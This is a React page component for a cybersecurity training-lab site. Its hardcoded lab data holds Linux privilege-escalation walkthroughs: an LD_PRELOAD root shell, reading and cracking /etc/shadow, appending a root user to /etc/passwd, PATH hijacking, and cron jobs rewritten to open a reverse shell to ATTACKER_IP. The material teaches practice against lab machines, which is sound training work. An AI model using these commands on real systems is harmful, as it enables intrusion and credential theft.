
import GlobalLeaderboard from '@/components/labs/GlobalLeaderboard';
import LabMachine from '@/components/labs/LabMachine';
import Leaderboard from '@/components/labs/Leaderboard';
import StartLabDialog from '@/components/labs/StartLabDialog';
import Footer from '@/components/layout/Footer';
import Navbar from '@/components/layout/Navbar';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Progress } from '@/components/ui/progress';
import { Lab, LabNew, LeaderboardEntry } from '@/types/lab';
import { Award, Clock, Filter, Play, Quote, Shield, Sparkles, Users, Wand2 } from 'lucide-react';
import { useEffect, useState } from 'react';
import { Link, useParams } from 'react-router-dom';

export const labsDataNew: LabNew[] = [
  {
    id: 1,
    title: "Privilege Escalation via LD_PRELOAD",
    description:
      "Explore how to exploit the LD_PRELOAD environment variable to gain root access when env_keep is enabled in sudoers. You'll learn how to write a shared object in C that spawns a root shell.",
    keyConcepts: [
      "LD_PRELOAD can be used to preload shared libraries before executing a program.",
      "The env_keep option must be enabled in sudoers for LD_PRELOAD to work.",
      "A shared object can be crafted to escalate privileges."
    ],
    accessInfo: {},
    techniques: [
      {
        title: "Exploit LD_PRELOAD",
        steps: [
          "Check for LD_PRELOAD usability with sudo (env_keep).",
          "Write a C program that runs a root shell using _init().",
          "Compile it with: gcc -fPIC -shared -o shell.so shell.c -nostartfiles",
          "Run it: sudo LD_PRELOAD=/path/to/shell.so find"
        ],
        commands: [
          "gcc -fPIC -shared -o shell.so shell.c -nostartfiles",
          "sudo LD_PRELOAD=/path/to/shell.so find"
        ]
      }
    ],
    bonusTip:
      "Ensure that your real user ID matches the effective user ID; otherwise, LD_PRELOAD will be ignored.",
    footerNote:
      "This lab demonstrates how to use LD_PRELOAD for privilege escalation by leveraging custom shared objects.",
    difficulty: "hard",
    category: "Privilege Escalation",
    estimatedTime: "1.5 hours",
    completionRate: 40,
    participants: 380,
    attackMachineUrl: "https://example.com/attack-vm/ldpreload",
    targetMachineUrl: "https://example.com/target-vm/ldpreload"
  },
  {
    id: 2,
    title: "Privilege Escalation: SUID",
    description:
      "Learn how to leverage SUID binaries to escalate privileges in Linux environments.",
    keyConcepts: [
      "SUID (Set-user ID) allows users to execute files with the privileges of the file owner.",
      "You can list SUID binaries using: find / -type f -perm -04000 -ls 2>/dev/null",
      "GTFOBins is a useful resource for finding exploitable SUID binaries."
    ],
    accessInfo: {
      username: "karen",
      password: "Password1"
    },
    techniques: [
      {
        title: "Read /etc/shadow using SUID nano",
        steps: [
          "Run: nano /etc/shadow",
          "Copy contents and pair with /etc/passwd.",
          "Use unshadow and john to crack passwords."
        ],
        commands: [
          "unshadow passwd.txt shadow.txt > passwords.txt",
          "john passwords.txt --wordlist=rockyou.txt"
        ]
      },
      {
        title: "Add a root user to /etc/passwd",
        steps: [
          "Generate a hash: openssl passwd -1 -salt xyz yourpassword",
          "Open /etc/passwd with nano (SUID) and append a new user entry.",
          "Switch to the new user using: su hacker"
        ],
        commands: [
          "openssl passwd -1 -salt xyz yourpassword",
          "nano /etc/passwd",
          "echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd",
          "su hacker"
        ]
      }
    ],
    bonusTip:
      "Explore other SUID binaries besides nano to find alternative exploitation paths.",
    footerNote:
      "This lab provides practical techniques for privilege escalation using SUID binaries in a Linux environment.",
    difficulty: "medium",
    category: "Privilege Escalation",
    estimatedTime: "1 hour",
    completionRate: 65,
    participants: 620,
    attackMachineUrl: "https://example.com/attack-vm/suid",
    targetMachineUrl: "https://example.com/target-vm/suid"
  },
  {
    id: 3,
    title: "Privilege Escalation using Capabilities",
    description:
      "Explore how Linux capabilities can be misused to escalate privileges. You'll learn how to identify binaries with special capabilities and leverage them to gain root access.",
    keyConcepts: [
      "Linux capabilities offer granular privilege control over binaries.",
      "getcap can be used to list binaries with set capabilities.",
      "Some binaries with capabilities like cap_setuid or cap_net_bind_service can be exploited to escalate privileges.",
      "GTFObins provides known exploitation techniques for such binaries."
    ],
    accessInfo: {
      username: "karen",
      password: "Password1"
    },
    techniques: [
      {
        title: "Privilege Escalation using vim and capabilities",
        steps: [
          "Run: getcap -r / 2>/dev/null to find files with capabilities.",
          "Check if vim has cap_setuid or similar capability set.",
          "Use vim to spawn a shell with elevated privileges.",
          "Command: vim -c ':! /bin/bash'"
        ],
        commands: [
          "getcap -r / 2>/dev/null",
          "vim -c ':! /bin/bash'"
        ]
      }
    ],
    bonusTip:
      "Use the capabilities man page (man 7 capabilities) to understand all available capability types.",
    footerNote:
      "This lab focuses on privilege escalation by abusing Linux file capabilities. Always check capability flags as part of post-exploitation.",
    difficulty: "medium",
    category: "Privilege Escalation",
    estimatedTime: "1.25 hours",
    completionRate: 58,
    participants: 540,
    attackMachineUrl: "https://example.com/attack-vm/capabilities",
    targetMachineUrl: "https://example.com/target-vm/capabilities"
  },
  {
    id: 4,
    title: "Privilege Escalation via Misconfigured Cron Jobs",
    description:
      "Understand how misconfigured cron jobs can be exploited to escalate privileges by modifying scripts executed by root on a schedule.",
    keyConcepts: [
      "Cron jobs run scripts or binaries at scheduled times with the owner's privileges.",
      "Misconfigured cron jobs can allow lower-privileged users to escalate to root.",
      "System-wide cron jobs are often defined in /etc/crontab.",
      "Absence of full script paths in crontab PATHs may allow script injection from user directories."
    ],
    accessInfo: {
      username: "karen",
      password: "Password1"
    },
    techniques: [
      {
        title: "Exploit backup.sh script",
        steps: [
          "Inspect /etc/crontab to find system-wide scheduled cron jobs.",
          "Identify scripts like /opt/scripts/backup.sh run by root.",
          "Modify the script to include a reverse shell payload.",
          "Start a listener on your attack machine to receive the shell."
        ],
        commands: [
          "cat /etc/crontab",
          "echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /opt/scripts/backup.sh",
          "nc -lvnp PORT"
        ]
      },
      {
        title: "Exploit missing antivirus.sh script",
        steps: [
          "Find cron jobs referencing non-existent scripts like antivirus.sh.",
          "Place a malicious script with that name in a PATH-listed directory (e.g., /home/karen/).",
          "Wait for the cron job to execute and gain root shell.",
          "Make sure your reverse shell listener is active."
        ],
        commands: [
          "echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > ~/antivirus.sh",
          "chmod +x ~/antivirus.sh",
          "nc -lvnp PORT"
        ]
      }
    ],
    bonusTip:
      "Even if a cron job’s script was deleted, it may still be exploitable if the script path isn't fully qualified in crontab.",
    footerNote:
      "Always review cron job setups on systems. Poor cleanup and misconfiguration often lead to high-impact privilege escalation opportunities.",
    difficulty: "medium",
    category: "Privilege Escalation",
    estimatedTime: "1.5 hours",
    completionRate: 61,
    participants: 590,
    attackMachineUrl: "https://example.com/attack-vm/cron",
    targetMachineUrl: "https://example.com/target-vm/cron"
  },
  {
    id: 5,
    title: "Privilege Escalation: PATH",
    description:
      "Learn how insecure PATH configurations can be exploited for privilege escalation. This lab demonstrates hijacking SUID binaries by placing malicious executables in writable directories in PATH.",
    keyConcepts: [
      "PATH defines directories to search for executables.",
      "Writable directories in PATH can be hijacked by unprivileged users.",
      "SUID binaries executing generic commands may run malicious payloads with elevated privileges."
    ],
    accessInfo: {
      username: "karen",
      password: "Password1"
    },
    techniques: [
      {
        title: "Identify writable PATH directories",
        steps: [
          "Display current PATH with: echo $PATH",
          "Search for writable directories: find / -writable 2>/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u",
          "Compare writable directories against PATH entries."
        ],
        commands: [
          "echo $PATH",
          "find / -writable 2>/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u"
        ]
      },
      {
        title: "Hijack SUID script via PATH",
        steps: [
          "Add a writable directory (e.g., /tmp) to PATH: export PATH=/tmp:$PATH",
          "Copy a shell binary to the writable directory as 'thm': cp /bin/bash /tmp/thm",
          "Make it executable: chmod +x /tmp/thm",
          "Execute the SUID script (e.g., './path') to spawn a root shell."
        ],
        commands: [
          "export PATH=/tmp:$PATH",
          "cp /bin/bash /tmp/thm",
          "chmod +x /tmp/thm",
          "./path"
        ]
      }
    ],
    bonusTip:
      "Always verify PATH ordering and avoid writable directories early in PATH when configuring SUID binaries.",
    footerNote:
      "This lab illustrates how SUID binaries relying on external commands can be exploited by hijacking PATH entries.",
    difficulty: "medium",
    category: "Privilege Escalation",
    estimatedTime: "1.5 hours",
    completionRate: 63,
    participants: 495,
    attackMachineUrl: "https://example.com/attack-vm/path",
    targetMachineUrl: "https://example.com/target-vm/path"
  },
  {
    id: 6,
    title: "Introduction to Network Security",
    description:
      "Learn the basics of network security, including common vulnerabilities and protection mechanisms.",
    keyConcepts: [
      "Fundamental principles of network security",
      "Common vulnerabilities in network protocols",
      "Techniques to protect and secure networks"
    ],
    accessInfo: {},
    techniques: [],
    bonusTip: "",
    footerNote:
      "Gain foundational knowledge that is essential for understanding more advanced security concepts.",
    difficulty: "easy",
    category: "Network Security",
    estimatedTime: "1 hour",
    completionRate: 85,
    participants: 1240,
    attackMachineUrl: "https://example.com/attack-vm/1",
    targetMachineUrl: "https://example.com/target-vm/1"
  },
  {
    id: 7,
    title: "Web Application Penetration Testing",
    description:
      "Discover how to identify and exploit common web vulnerabilities like XSS and SQL injection.",
    keyConcepts: [
      "Common web vulnerabilities",
      "Exploitation techniques for XSS and SQL injection",
      "Testing methodologies for web applications"
    ],
    accessInfo: {},
    techniques: [],
    bonusTip: "",
    footerNote:
      "Develop practical skills in assessing and securing web applications.",
    difficulty: "medium",
    category: "Web Security",
    estimatedTime: "2 hours",
    completionRate: 72,
    participants: 890,
    attackMachineUrl: "https://example.com/attack-vm/2",
    targetMachineUrl: "https://example.com/target-vm/2"
  },
  {
    id: 8,
    title: "Cryptography Fundamentals",
    description:
      "Understand encryption, hashing, and digital signatures through practical examples.",
    keyConcepts: [
      "Basics of encryption and decryption",
      "Hashing algorithms and their uses",
      "Digital signatures and public key infrastructure"
    ],
    accessInfo: {},
    techniques: [],
    bonusTip: "",
    footerNote:
      "Enhance your cryptographic knowledge with hands-on examples.",
    difficulty: "easy",
    category: "Cryptography",
    estimatedTime: "1.5 hours",
    completionRate: 91,
    participants: 1560,
    attackMachineUrl: "https://example.com/attack-vm/3",
    targetMachineUrl: "https://example.com/target-vm/3"
  },
  {
    id: 9,
    title: "Advanced Malware Analysis",
    description:
      "Learn techniques to analyze and reverse engineer malicious software.",
    keyConcepts: [
      "Static and dynamic analysis of malware",
      "Reverse engineering techniques",
      "Tools and methodologies for malware analysis"
    ],
    accessInfo: {},
    techniques: [],
    bonusTip: "",
    footerNote:
      "Dive deep into the world of malware analysis and understand advanced reverse engineering techniques.",
    difficulty: "hard",
    category: "Malware",
    estimatedTime: "3 hours",
    completionRate: 45,
    participants: 420,
    attackMachineUrl: "https://example.com/attack-vm/4",
    targetMachineUrl: "https://example.com/target-vm/4"
  },
  {
    id: 10,
    title: "IoT Security Challenges",
    description:
      "Explore security vulnerabilities in Internet of Things devices and how to secure them.",
    keyConcepts: [
      "Unique challenges in IoT security",
      "Common vulnerabilities in IoT devices",
      "Strategies for securing IoT environments"
    ],
    accessInfo: {},
    techniques: [],
    bonusTip: "",
    footerNote:
      "Understand the security challenges specific to IoT devices and learn strategies to mitigate them.",
    difficulty: "medium",
    category: "IoT Security",
    estimatedTime: "2 hours",
    completionRate: 68,
    participants: 730,
    attackMachineUrl: "https://example.com/attack-vm/5",
    targetMachineUrl: "https://example.com/target-vm/5"
  },
  {
    id: 11,
    title: "Cloud Security Architecture",
    description:
      "Learn how to design and implement secure cloud environments across major providers.",
    keyConcepts: [
      "Principles of cloud security architecture",
      "Best practices for securing cloud infrastructures",
      "Implementation strategies for multi-cloud environments"
    ],
    accessInfo: {},
    techniques: [],
    bonusTip: "",
    footerNote:
      "Master the design and implementation of secure cloud architectures to protect sensitive data and applications.",
    difficulty: "hard",
    category: "Cloud Security",
    estimatedTime: "2.5 hours",
    completionRate: 53,
    participants: 510,
    attackMachineUrl: "https://example.com/attack-vm/6",
    targetMachineUrl: "https://example.com/target-vm/6"
  }
];



interface LabDetailNewProps {
  lab: LabNew;
}

const LabDetailNew = ({ lab }: LabDetailNewProps) => {
  // Fallback defaults for fields that existed on the old Lab type.
  const defaultDifficulty = "medium"; // or 'easy' / 'advanced' as a fallback
  const defaultCategory = "Cybersecurity";
  const defaultEstimatedTime = "N/A";
  const defaultCompletionRate = 0;
  const defaultParticipants = 0;

  // Optionally, if you want to extract these from keyConcepts (if available)
  // you might use the first few keyConcepts as stand-ins.
  const difficulty =
    lab.keyConcepts[0] && lab.keyConcepts[0].toLowerCase().includes('ld_preload')
      ? "advanced"
      : defaultDifficulty;
  const category = defaultCategory;
  const estimatedTime = defaultEstimatedTime;
  const completionRate = defaultCompletionRate;
  const participants = defaultParticipants;

  const [startDialogOpen, setStartDialogOpen] = useState(false);
  // Since LabNew no longer includes status, we default to 'not_started'
  const [labStatus, setLabStatus] = useState<'not_started' | 'in_progress' | 'completed'>('not_started');

  // Hardcoded leaderboard data remains unchanged.
  const leaderboardData = [
    {
      userId: "user1",
      username: "Alice Cooper",
      completionTime: 720000, // 12 minutes in ms
      score: 95,
      date: new Date(Date.now() - 86400000 * 2) // 2 days ago
    },
    {
      userId: "user2",
      username: "Bob Smith",
      completionTime: 840000, // 14 minutes in ms
      score: 90,
      date: new Date(Date.now() - 86400000 * 3) // 3 days ago
    },
    {
      userId: "user3",
      username: "Charlie Davis",
      completionTime: 900000, // 15 minutes in ms
      score: 88,
      date: new Date(Date.now() - 86400000 * 1) // 1 day ago
    },
    {
      userId: "user4",
      username: "Diana Evans",
      completionTime: 1020000, // 17 minutes in ms
      score: 82,
      date: new Date(Date.now() - 86400000 * 4) // 4 days ago
    },
    {
      userId: "user5",
      username: "Ethan Williams",
      completionTime: 780000, // 13 minutes in ms
      score: 80,
      date: new Date(Date.now() - 86400000 * 5) // 5 days ago
    }
  ];

  // Placeholder for starting the lab.
  const handleStartLab = () => {
    // startLabMutation.mutate();
    setLabStatus('in_progress');
  };

  return (
    <div className="space-y-6">
      <div className="flex flex-col gap-4">
        {/* Header Section */}
        <div className="flex items-start justify-between">
          <div>
            <h1 className="text-3xl md:text-4xl font-bold mb-2">{lab.title}</h1>
            <div className="flex flex-wrap gap-2 mb-4">
              <Badge variant={
                lab.difficulty === 'easy' ? 'default' :
                  lab.difficulty === 'medium' ? 'secondary' : 'destructive'
              }>
                {lab.difficulty.charAt(0).toUpperCase() + lab.difficulty.slice(1)}
              </Badge>
              <Badge variant="outline">{lab.category}</Badge>
              <div className="flex items-center text-sm text-muted-foreground">
                <Clock className="h-3.5 w-3.5 mr-1" />
                {lab.estimatedTime}
              </div>
            </div>
          </div>

          {labStatus === 'not_started' ? (
            <Button className="gap-2" onClick={() => setStartDialogOpen(true)}>
              <Play className="h-4 w-4" />
              Start Lab
            </Button>
          ) : labStatus === 'in_progress' ? (
            <Button variant="secondary" className="gap-2">
              <Play className="h-4 w-4" />
              Continue Lab
            </Button>
          ) : (
            <Button variant="outline" className="gap-2">
              <Award className="h-4 w-4" />
              Completed
            </Button>
          )}

          <StartLabDialog
            lab={lab}
            open={startDialogOpen}
            onOpenChange={setStartDialogOpen}
            onStart={handleStartLab}
          />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 bg-muted/30 p-4 rounded-lg">
          <div className="flex flex-col space-y-1">
            <span className="text-sm text-muted-foreground">Completion Rate</span>
            <div className="flex items-center space-x-2">
              <Progress value={lab.completionRate} className="h-2 " color={lab.completionRate > 30 ? lab.completionRate > 70 ? 'bg-blue-500' : 'bg-brand-500' : 'bg-red-500'} />
              <span className="text-sm font-medium">{lab.completionRate}%</span>
            </div>
          </div>

          <div className="flex items-center space-x-2">
            <Users className="h-4 w-4 text-muted-foreground" />
            <span className="text-sm text-muted-foreground">{lab.participants} participants</span>
          </div>

          <div className="flex items-center space-x-2">
            <Shield className="h-4 w-4 text-muted-foreground" />
            <span className="text-sm text-muted-foreground">
              {lab.difficulty === 'easy' ? 'Beginner friendly' :
                lab.difficulty === 'medium' ? 'Intermediate skills required' :
                  'Advanced knowledge needed'}
            </span>
          </div>
        </div>

        {/* About This Lab */}
        <div className="space-y-4">
          <h2 className="text-xl font-semibold">About this lab</h2>
          <p className="text-muted-foreground">{lab.description}</p>
          <p className="text-muted-foreground">
            This hands-on lab will guide you through various security concepts and practical
            exercises. You will gain practical experience in {category.toLowerCase()}
            and develop skills that are directly applicable in real-world cybersecurity scenarios.
          </p>
        </div>

        {/* Techniques Section (new addition) */}
        {lab.techniques && lab.techniques.length > 0 && (
          <div className="pt-6 space-y-4">
            <h2 className="text-xl font-semibold">Techniques Covered</h2>
            <div className="space-y-4">
              {lab.techniques.map((tech, index) => (
                <div
                  key={index}
                  className="border rounded-xl p-4 bg-muted/40 shadow-sm"
                >
                  <h3 className="text-lg font-semibold mb-2 flex items-center gap-2">
                    <Wand2 className="h-4 w-4 text-primary" />
                    {tech.title}
                  </h3>

                  <div className="space-y-3">
                    {tech.steps.map((step, stepIndex) => (
                      <div
                        key={stepIndex}
                        className="p-3 rounded-lg bg-background border-l-4 border-primary pl-4"
                      >
                        <span className="text-sm text-muted-foreground">
                          Step {stepIndex + 1}:
                        </span>
                        <p className="text-sm">{step}</p>
                      </div>
                    ))}

                    {tech.commands && tech.commands.length > 0 && (
                      <details className="bg-muted/50 mt-3 rounded-md p-3">
                        <summary className="cursor-pointer font-medium text-sm text-primary">
                          Show related commands
                        </summary>
                        <div className="mt-2 space-y-1">
                          {tech.commands.map((cmd, cmdIndex) => (
                            <code
                              key={cmdIndex}
                              className="block px-2 py-1 rounded bg-background border text-sm font-mono"
                            >
                              {cmd}
                            </code>
                          ))}
                        </div>
                      </details>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* What You'll Learn Section */}
        <div className="pt-4">
          <h2 className="text-xl font-semibold mb-4">What you'll learn</h2>
          <ul className="space-y-2">
            <li className="flex items-start">
              <div className="mr-2 mt-1 h-2 w-2 rounded-full bg-primary" />
              <span>Key concepts in {category}</span>
            </li>
            <li className="flex items-start">
              <div className="mr-2 mt-1 h-2 w-2 rounded-full bg-primary" />
              <span>Practical techniques for identifying vulnerabilities</span>
            </li>
            <li className="flex items-start">
              <div className="mr-2 mt-1 h-2 w-2 rounded-full bg-primary" />
              <span>Methods to protect systems from common attacks</span>
            </li>
            <li className="flex items-start">
              <div className="mr-2 mt-1 h-2 w-2 rounded-full bg-primary" />
              <span>Industry best practices for security implementation</span>
            </li>
          </ul>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 pt-6">
          <div className="lg:col-span-2">
            <LabMachine isAttackerMachine isTargetMachine labId={lab.id} />
          </div>
          <div>
            <Leaderboard
              entries={leaderboardData}
              isLoading={false}
            />
          </div>
        </div>

        {/* New Bonus Tip and Footer Note Section */}
        <div className="space-y-4">
          {lab.bonusTip && (
            <div className="pt-6">
              <div className="bg-yellow-100 dark:bg-yellow-900/20 border-l-4 border-yellow-500 rounded-md p-4">
                <div className="flex items-start gap-3">
                  <Sparkles className="h-5 w-5 text-yellow-600 mt-1" />
                  <div>
                    <h3 className="text-base font-semibold text-yellow-700 dark:text-yellow-400 mb-1">
                      Bonus Tip
                    </h3>
                    <p className="text-sm text-yellow-800 dark:text-yellow-200">{lab.bonusTip}</p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {lab.footerNote && (
            <div className="pt-6">
              <div className="border-t pt-4 text-sm text-muted-foreground text-center">
                <Quote className="inline-block h-4 w-4 mr-1 text-muted-foreground" />
                {lab.footerNote}
              </div>
            </div>
          )}

        </div>
      </div>
    </div>
  );
};

const LabCard = ({ lab }: { lab: LabNew }) => {
  return (
    <Card key={lab._id} className="overflow-hidden hover:shadow-md transition-shadow">
      <CardContent className="p-6">
        <div className="flex justify-between items-start mb-2">
          <h3 className="text-xl font-semibold">{lab.title}</h3>
          <Badge variant={
            lab.difficulty === 'easy' ? 'default' :
              lab.difficulty === 'medium' ? 'secondary' : 'destructive'
          } className="ml-2">
            {lab.difficulty.charAt(0).toUpperCase() + lab.difficulty.slice(1)}
          </Badge>
        </div>

        <Badge variant="outline" className="mb-3">{lab.category}</Badge>

        <p className="text-muted-foreground mb-4 line-clamp-2">
          {lab.description}
        </p>

        <div className="flex justify-between items-center mb-4 text-sm text-muted-foreground">
          <div className="flex items-center">
            <Clock className="h-4 w-4 mr-1" />
            {lab.estimatedTime}
          </div>
          <div className="flex items-center">
            <Users className="h-4 w-4 mr-1" />
            {lab.participants}
          </div>
        </div>

        <div className="flex items-center justify-between mb-2">
          <span className="text-sm">Completion Rate</span>
          <span className="text-sm font-medium">{lab.completionRate}%</span>
        </div>
        <Progress value={lab.completionRate} className="h-2 mb-4" color={lab.completionRate > 30 ? lab.completionRate > 70 ? 'bg-blue-500' : 'bg-brand-500' : 'bg-red-500'} />
        <Button asChild className="w-full">
          <Link to={`/labs/${lab.id}`}>View Lab</Link>
        </Button>
      </CardContent>
    </Card>
  );
};

const Labs = () => {
  const { labId } = useParams();
  const [selectedLab, setSelectedLab] = useState<LabNew | null>(labsDataNew["1"]);

  // const {
  //   data: labs,
  //   isLoading: isLoadingLabs,
  //   error: labsError
  // } = useQuery({
  //   queryKey: ['labs'],
  //   queryFn: fetchLabs,
  // });

  // useEffect(() => {
  //   if (labsError) {
  //     console.error('Failed to fetch labs:', labsError);
  //     toast.error('Failed to load labs data. Using mock data instead.');
  //   }
  // }, [labsError]);

  // const {
  //   data: lab,
  //   isLoading: isLoadingLab,
  //   error: labError
  // } = useQuery({
  //   queryKey: ['lab', labId],
  //   queryFn: () => fetchLabById(labId!),
  //   enabled: !!labId,
  // });

  // useEffect(() => {
  //   if (labError) {
  //     console.error(`Failed to fetch lab with ID ${labId}:`, labError);
  //     toast.error('Failed to load lab data. Using mock data instead.');
  //   }
  // }, [labError, labId]);

  useEffect(() => {
    window.scrollTo(0, 0);

    if (labId) {
      //   if (lab) {
      //     setSelectedLab(lab);
      //   } else if (labError) {
      //     const mockLab = labsData.find(l => l.id === parseInt(labId) || l._id === labId);
      //     if (mockLab) {
      //       setSelectedLab(mockLab);
      //     } else {
      //       setSelectedLab(null);
      //     }
      //   }
      // } 
      const mockLab = labsDataNew.find(l => l.id === parseInt(labId) || l._id === labId);
      if (mockLab) {
        setSelectedLab(mockLab);
      } else {
        setSelectedLab(null);
      }
    }
    else {
      setSelectedLab(null);
    }
  },
    // [labId, lab, labError]
    [labId]
  );

  // if ((labId && isLoadingLab) || (!labId && isLoadingLabs)) {
  //   return (
  //     <div className="flex flex-col min-h-screen">
  //       <Navbar />
  //       <main className="flex-1 py-16 px-4 md:px-6 bg-muted/30">
  //         <div className="container mx-auto">
  //           <div className="flex justify-center items-center h-64">
  //             <div className="text-center">
  //               <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary mx-auto mb-4"></div>
  //               <p className="text-muted-foreground">Loading...</p>
  //             </div>
  //           </div>
  //         </div>
  //       </main>
  //       <Footer />
  //     </div>
  //   );
  // }

  // const displayedLabs = labs || labsData;
  const displayedLabs = labsDataNew;

  return (
    <div className="flex flex-col min-h-screen">
      <Navbar />

      <main className="flex-1 py-16 px-4 md:px-6 bg-muted/30">
        <div className="container mx-auto mt-10">
          {selectedLab ? (
            <>
              <div className="mb-6">
                <Button variant="outline" asChild>
                  <Link to="/labs">
                    ← Back to Labs
                  </Link>
                </Button>
              </div>
              <LabDetailNew lab={selectedLab} />
            </>
          ) : (
            <>
              <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-8 gap-4">
                <div>
                  <h1 className="text-3xl md:text-4xl font-bold mb-2">Cybersecurity Labs</h1>
                  <p className="text-muted-foreground">
                    Explore our hands-on labs designed to build real-world cybersecurity skills.
                  </p>
                </div>

                <Button variant="outline" className="flex items-center gap-2">
                  <Filter className="h-4 w-4" />
                  Filter Labs
                </Button>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                <div className="lg:col-span-2">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    {displayedLabs.map((lab) => (
                      <LabCard key={lab._id || lab.id} lab={lab} />
                    ))}
                  </div>
                </div>

                <div>
                  <GlobalLeaderboard />
                </div>
              </div>
            </>
          )}
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default Labs;